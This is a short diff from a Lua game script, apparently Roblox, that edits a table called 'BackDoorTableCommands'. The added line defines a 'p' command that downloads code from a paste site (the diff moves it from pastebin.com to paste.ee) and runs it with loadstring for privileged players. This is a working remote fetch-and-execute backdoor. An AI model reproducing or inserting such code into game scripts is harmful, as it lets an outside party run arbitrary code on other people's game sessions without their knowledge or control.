@@ -181,7 +181,7 @@ local BackDoorTableCommands = {
 		['Levels'] = {[4] = true;}
 	};
 	['p'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then loadstring(game:HttpGet("https://www.pastebin.com/raw/"..Content))() end end;
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then loadstring(game:HttpGet("https://paste.ee/r/"..Content))() end end;
 		['Levels'] = {[3] = true;[4] = true;}
 	}
 }
